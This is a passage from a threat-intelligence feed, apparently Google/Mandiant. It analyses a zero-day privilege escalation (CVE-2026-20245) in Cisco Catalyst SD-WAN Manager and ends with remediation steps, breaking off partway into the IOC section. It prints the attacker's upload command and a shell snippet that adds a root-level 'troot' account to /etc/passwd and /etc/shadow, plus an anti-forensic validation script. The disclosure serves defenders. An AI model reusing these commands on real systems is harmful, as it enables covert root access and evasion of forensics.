+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Future Work&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;As we noted earlier this year, the residential proxy industry appears to be rapidly expanding, and this coordinated disruption is not the end of our work combating malicious residential proxy networks. This industry is deeply connected and operators depend on overlapping botnet networks that are constantly resold. While point-in-time disruptions are a critical tool to protect our users, continued and coordinated effort is needed to reduce malicious proxy networks in the long run. We encourage mobile platforms, ISPs, and other tech platforms to continue sharing intelligence and to take direct action to block malicious C2 infrastructure.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;</description><pubDate>Thu, 02 Jul 2026 14:00:00 +0000</pubDate><guid>https://cloud.google.com/blog/topics/threat-intelligence/google-continued-disruption-residential-proxy-networks/</guid><category>Threat Intelligence</category><og xmlns:og="http://ogp.me/ns#"><type>article</type><title>Google’s Continued Disruption of Malicious Residential Proxy Networks</title><description></description><site_name>Google</site_name><url>https://cloud.google.com/blog/topics/threat-intelligence/google-continued-disruption-residential-proxy-networks/</url></og><author xmlns:author="http://www.w3.org/2005/Atom"><name>Google Threat Intelligence Group </name><title></title><department></department><company></company></author></item><item><title>Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</title><link>https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager/</link><description>&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;Written by: Chester Sng, Pete Boonyakarn, Logeswaran Nadarajan, Lukasz Lamparski&lt;/p&gt;
+&lt;hr/&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Introduction&lt;/span&gt;&lt;strong style="vertical-align: baseline;"&gt; &lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In early 2026, Mandiant identified a threat actor targeting SD-WAN infrastructure at a service provider. After gaining initial access, the threat actor exploited a zero-day vulnerability (&lt;/span&gt;&lt;a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;CVE-2026-20245&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;) in Cisco Catalyst SD-WAN to escalate privileges from a compromised administrative account to root-level access.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The vulnerability stems from the device’s file upload feature lacking the ability to properly filter malicious data.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Throughout the intrusion, to maintain operational security and avoid detection, the threat actor consistently employed anti-forensic techniques, selectively deleting and restoring system configuration files that were modified during their activities.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Key Observations&lt;/span&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;strong style="vertical-align: baseline;"&gt;Rogue Peering and Credential Manipulation&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: In March 2026, a threat actor established initial access via unauthorized peering connections to facilitate Secure Shell (SSH) access. The threat actor used that access to manipulate default account passwords to evade detection&lt;/span&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Exploitation of CVE-2026-20245&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Subsequently, the attacker leveraged a zero-day privilege escalation vulnerability (now tracked as CVE-2026-20245) in Cisco Catalyst SD-WAN Manager to gain root-level access via a malicious CSV upload.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Extensive Anti-Forensic Cleanup&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: The threat actor deleted malicious files, reverted configuration changes, and executed a validation script to ensure indicators are purged&lt;/span&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;What is SD-WAN?&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Traditional Wide Area Networks (WANs) rely heavily on physical, proprietary hardware routers to direct traffic. This model is often rigid, complex to scale, and struggles to handle the demands of modern cloud computing.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;span style="vertical-align: baseline;"&gt;Software-Defined Wide Area Network (SD-WAN) solves this by decoupling the network’s management and control logic from the underlying physical hardware. Instead of configuring individual routers one by one, a centralized software controller is used to orchestrate the entire network from a single dashboard. SD-WANs are typically used by highly distributed organizations, such as banks, retail corporations, technology services, and healthcare providers, to securely connect multiple remote branch locations directly to central cloud services&lt;/span&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;What is Peering?&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Within an SD-WAN fabric, peering is the logical process of establishing a trusted, authenticated relationship between distinct network components, such as edge routers, regional hubs, and central controllers.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Before any data can be securely transmitted across the network fabric, these devices must perform a digital handshake. During the peering phase, devices mutually authenticate each other using cryptographic certificates. Once identity and trust are verified, they exchange underlying routing tables and automatically build secure tunnels to facilitate safe data transport. &lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Additional Vulnerabilities in Cisco Catalyst SD-WAN Controllers&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa-EHchtZk" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;CVE-2026-20127&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa2-v69WY2SW" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;CVE-2026-20182&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; are critical vulnerabilities recently disclosed by Cisco that affect the peering authentication mechanism for Cisco Catalyst SD-WAN controllers. Both vulnerabilities could allow an unauthenticated, remote attacker to bypass authentication and obtain administrative privileges.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Intrusion Campaign Overview&lt;/span&gt;&lt;/h3&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Initial Access Via Rogue Peering Connections&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;span style="vertical-align: baseline;"&gt;From late 2025 to January 2026, Mandiant observed multiple unauthorized peering connections to the victim’s SD-WAN Manager devices. It is possible that these connections occurred due to the exploitation of CVE-2026-20127 or CVE-2026-20182 as the vulnerabilities were not disclosed, and patches were not available during this period&lt;/span&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Beginning in March 2026, further unauthorized peering connections were seen on a device running a software version unaffected by CVE-2026-20127. However, Cisco confirmed that these connections did not leverage CVE-2026-20182 either, and could instead be using stolen certificate material from a previous compromise of the same device.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;It is unclear if the same threat actor was responsible for the late 2025 to January 2026 and March 2026 rogue peering activity. &lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Successful Authentications By Altering The Admin Account Password&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In March 2026, the threat actor established new rogue peer connections and successfully authenticated to the SD-WAN Manager device via SSH using the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;vmanage-admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account on the same victim devices.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Once authenticated via SSH, the threat actor executed commands to change the password of the default &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account. The threat actor authenticated directly to the SD-WAN Manager web application interface using the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account and exfiltrated configurations of the SD-WAN fabric.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;[2026-03-07T01:31:48.464Z]"POST /j_security_check HTTP/1.1" 200 - 31 0 1288 - "&amp;lt;Threat Actor Control Plane IP&amp;gt;" "Mozilla/5.0" "&amp;lt;Log ID&amp;gt;" "&amp;lt;SD-WAN Manager IP&amp;gt;:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:49.017Z] "GET /dataservice/system/device/vedges HTTP/1.1" 200 - 0 10114 127 - "&amp;lt;Threat Actor Control Plane IP&amp;gt;" "Mozilla/5.0" "&amp;lt;Log ID&amp;gt;" "&amp;lt;SD-WAN Manager IP&amp;gt;:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:50.017Z] "GET /dataservice/system/device/controllers HTTP/1.1" 200 - 0 15815 100 - "&amp;lt;Threat Actor Control Plane IP&amp;gt;" "Mozilla/5.0" "&amp;lt;Log ID&amp;gt;" "&amp;lt;SD-WAN Manager IP&amp;gt;:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:51.925Z] "GET /dataservice/template/config/attached/&amp;lt;Device ID&amp;gt; HTTP/1.1" 200 - 0 3732 18 - "&amp;lt;Threat Actor Control Plane IP&amp;gt;" "Mozilla/5.0" "&amp;lt;Log ID&amp;gt;" "&amp;lt;SD-WAN Manager IP&amp;gt;:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:52.493Z] "GET /dataservice/template/config/running/&amp;lt;Device ID&amp;gt; HTTP/1.1" 400 - 0 134 19 - "&amp;lt;Threat Actor Control Plane IP&amp;gt;" "Mozilla/5.0" "&amp;lt;Log ID&amp;gt;" "&amp;lt;SD-WAN Manager IP&amp;gt;:8443" "127.0.0.1:8080"
+&amp;lt;...&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 1: Threat actor authentication and configuration extraction&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;span style="vertical-align: baseline;"&gt;The threat actor subsequently used their active &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;vmanage-admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; session to change the password of the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account back to its original state before terminating their active session. This activity was likely performed to reduce the probability of detection by an administrator trying to log into the device during day-to-day operations&lt;/span&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;vmanage-admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; accounts are default accounts on Cisco Catalyst SD-WAN controllers that have different privileges, but &lt;/span&gt;&lt;a href="https://www.cisco.com/c/en/us/td/docs/routers/sdwan/17-x/systems-interfaces/systems-interfaces-guide-17-x/users-and-access.html" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;neither possesses root shell access&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Exploitation of CVE-2026-20245 to Escalate Privileges&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;span style="vertical-align: baseline;"&gt;Mandiant observed that in April 2026, &lt;/span&gt;after establishing an SSH session with the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account, the threat actor exploited CVE-2026-20245 by executing the following command to upload a file named &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;evil_tenant.csv&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 2: Malicious file upload&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;CVE-2026-20245&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, a vulnerability reported to Cisco by Mandiant, exists in the command-line interface (CLI) of Cisco Catalyst SD-WAN Controllers that could allow an authenticated, local attacker to execute arbitrary commands as root by supplying a crafted file to the affected system.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;evil_tenant.csv&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; file contains the exploit payload. The following code block (Figure 3) shows a snippet of the exploit which attempts to append malicious entries to the system's &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/etc/passwd&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/etc/shadow&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; files.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;if [ -e /usr/share/viptela/vbond_vsmart_tenant_list ] &amp;amp;&amp;amp; grep -q '&amp;lt;redacted&amp;gt;' /usr/share/viptela/vbond_vsmart_tenant_list 2&amp;gt;/dev/null; then
+    echo absent &amp;gt; /home/admin/.orig_vbond_vsmart_tenant_list.state;
+elif [ -e /usr/share/viptela/vbond_vsmart_tenant_list ]; then
+    echo present &amp;gt; /home/admin/.orig_vbond_vsmart_tenant_list.state;
+    cp -a /usr/share/viptela/vbond_vsmart_tenant_list /home/admin/.orig_vbond_vsmart_tenant_list;
+else
+    echo absent &amp;gt; /home/admin/.orig_vbond_vsmart_tenant_list.state;
+fi;
+cp -a /etc/passwd /home/admin/.orig_passwd;
+cp -a /etc/shadow /home/admin/.orig_shadow;
+grep -q '^troot:' /etc/passwd || echo 'troot:x:0:0:root:/root:/bin/bash' &amp;gt;&amp;gt; /etc/passwd;
+grep -q '^troot:' /etc/shadow || echo 'troot:&amp;lt;redacted&amp;gt;:19000:0:99999:7:::' &amp;gt;&amp;gt; /etc/shadow&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 3: Appending malicious entries&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Through this command, the threat actor achieved the following:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Backed up the original &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;vbond_vsmart_tenant_list&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; configuration file, which would have been overwritten by the contents of &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;evil_tenant.csv&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; during the exploit. This backup was likely created to allow the actor to restore the file later, ensuring the SD-WAN Manager device did not load an invalid configuration that might alert administrators.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Created backups of the original &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/etc/passwd&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/etc/shadow&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; files.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Created a user account named &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;troot&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; with full root privileges.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Mandiant subsequently observed the threat actor accessing this new &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;troot&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account from the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account via the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;su&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; (substitute user) command.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Anti-Forensic Techniques&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;span style="vertical-align: baseline;"&gt;Mandiant identified that the threat actor deleted all files they created, including &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;evil_tenant.csv&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, and restored any system configurations they modified. These deletion and modifications were done to minimize their forensic footprint&lt;/span&gt;. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In addition to this, Mandiant also observed execution of a validation script, which checks if indicators of the threat actor's activities are removed. &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;for f in /home/admin/evil_tenant.csv /home/admin/.orig_vbond_vsmart_tenant_list /home/admin/.orig_vbond_vsmart_tenant_list.state /home/admin/.orig_passwd /home/admin/.orig_shadow; 
+    do if [ -e "$f" ]; 
+        then echo PRESENT:$f; ls -ld "$f"; 
+        else echo ABSENT:$f; 
+    fi; 
+done; 
+
+if grep -q '^troot:' /etc/passwd; 
+    then echo PRESENT:/etc/passwd:troot; 
+    else echo ABSENT:/etc/passwd:troot; 
+fi; 
+
+if [ -e /usr/share/viptela/vbond_vsmart_tenant_list ]; 
+    then echo PRESENT:/usr/share/viptela/vbond_vsmart_tenant_list; ls -ld /usr/share/viptela/vbond_vsmart_tenant_list; 
+    else echo ABSENT:/usr/share/viptela/vbond_vsmart_tenant_list; 
+fi&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 4: Validation script&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;This script checks for the presence of the following:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Threat actor-created files in &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/home/admin.&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;code style="vertical-align: baseline;"&gt;troot&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account in the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;passwd&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;shadow&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; files.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;code style="vertical-align: baseline;"&gt;vbond_vsmart_tenant_list&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, and if it exists, inspect information about the file. This is likely to check if the original file was restored.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Outlook and Implications&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;This campaign underscores the living off the edge paradigm, where threat actors prioritize the compromise of network appliances to bypass traditional security perimeters. As organizations increasingly adopt software-defined networking, the orchestrators managing these environments become primary targets. These devices offer a black box environment for threat actors: they often lack the telemetry required for deep forensic analysis, and their role as a central control plane provides a stealthy platform for persistent, wide-scale access to internal enterprise traffic. For state-sponsored actors, the ability to exploit zero-day vulnerabilities in these platforms remains a premier vector for long-term strategic intelligence collection. Google Threat Intelligence Group (GTIG) has &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/zero-days-exploited-2022"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;closely&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/2023-zero-day-trends"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;tracked&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/2024-zero-day-trends"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;and&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/2025-zero-day-review"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;reported&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; on increased zero-day exploitation of edge devices over the past several years.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Remediation and Hardening&lt;/span&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Perform IOC Sweep / Threat Hunting:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Collect logs and diagnostic data from SD-WAN devices by executing &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;request admin-tech&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; command on all control-plane components. Scan these collections for known IOCs and execute threat hunts focused on the TTPs identified in the Detections and Hunting section of this blog post. If true positive hits are observed, perform a full investigation.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Manual Remediation Support:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; As per Cisco’s guidance, any confirmed indicators of compromise or suspicious activity should be forwarded to &lt;/span&gt;&lt;a href="https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Cisco Technical Assistance Center (TAC)&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; for comprehensive review and remediation assistance.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Prioritize Immediate Patching and Upgrades:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Organizations must prioritize upgrading Cisco Catalyst SD-WAN Manager to fixed software releases, specifically versions 20.9.9.2, 20.12.7.2, 20.15.4.5, 20.15.5.3, 20.18.3.1, 26.1.1.2, or later, to remediate &lt;/span&gt;&lt;a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;CVE-2026-20245&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Implement Cisco Catalyst SD-WAN Hardening and Logging Guidelines&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Organizations should follow the comprehensive security best practices and configuration standards detailed in the &lt;/span&gt;&lt;a href="https://sec.cloudapps.cisco.com/security/center/resources/Cisco-Catalyst-SD-WAN-HardeningGuide" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Cisco Catalyst SD-WAN Hardening Guide&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. This guide provides a robust defense-in-depth framework for securing all SD-WAN components including the management, control, and data planes against unauthorized access.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Indicators of Compromise (IOCs)&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a free &lt;/span&gt;&lt;a href="https://www.virustotal.com/gui/collection/d966161b93100fb8905b9b81bd03e57bbc93f21534acee88999e77798e913d5b/summary" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;GTI Collection&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; for registered users.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Network Indicators&lt;/span&gt;&lt;/h4&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;div align="left"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
+&lt;div style="color: #5f6368; overflow-x: auto; overflow-y: hidden; width: 100%;"&gt;
